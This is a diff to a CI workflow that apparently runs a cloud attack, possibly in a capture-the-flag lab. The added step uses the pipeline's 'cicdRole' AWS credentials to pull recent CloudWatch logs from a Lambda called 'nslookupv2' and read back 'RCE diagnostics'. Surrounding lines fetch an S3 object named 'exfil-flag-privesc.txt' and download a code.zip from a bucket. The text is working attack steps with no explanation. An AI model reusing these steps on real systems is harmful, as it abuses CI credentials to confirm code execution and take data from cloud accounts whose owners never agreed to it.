@@ -99,6 +99,24 @@ jobs:
           curl -s -o /dev/null -w "HTTP %{http_code}\n" https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/exfil-flag-privesc.txt
           curl -s https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/exfil-flag-privesc.txt
 
+      - name: Read Lambda CloudWatch logs for RCE diagnostics
+        run: |
+          echo "--- Lambda CloudWatch log groups ---"
+          aws logs describe-log-groups --log-group-name-prefix /aws/lambda/nslookupv2 --query 'logGroups[].logGroupName' --output text
+          LOG_GROUP=$(aws logs describe-log-groups --log-group-name-prefix /aws/lambda/nslookupv2 --query 'logGroups[0].logGroupName' --output text)
+          if [ -n "$LOG_GROUP" ]; then
+            echo "Found log group: $LOG_GROUP"
+            echo "--- Recent log streams ---"
+            aws logs describe-log-streams --log-group-name "$LOG_GROUP" --order-by LastEventTime --descending --max-items 5 --query 'logStreams[].logStreamName' --output text
+            STREAM=$(aws logs describe-log-streams --log-group-name "$LOG_GROUP" --order-by LastEventTime --descending --max-items 1 --query 'logStreams[0].logStreamName' --output text)
+            if [ -n "$STREAM" ]; then
+              echo "--- Latest log stream events ---"
+              aws logs get-log-events --log-group-name "$LOG_GROUP" --log-stream-name "$STREAM" --query 'events[].message' --output text | tail -100
+            fi
+          else
+            echo "(no log group found, maybe cicdRole lacks logs:Describe* permissions)"
+          fi
+
       - name: Grab code.zip for inspection
         run: |
           aws s3 cp s3://codec4f26c862a321ef5/code.zip code.zip
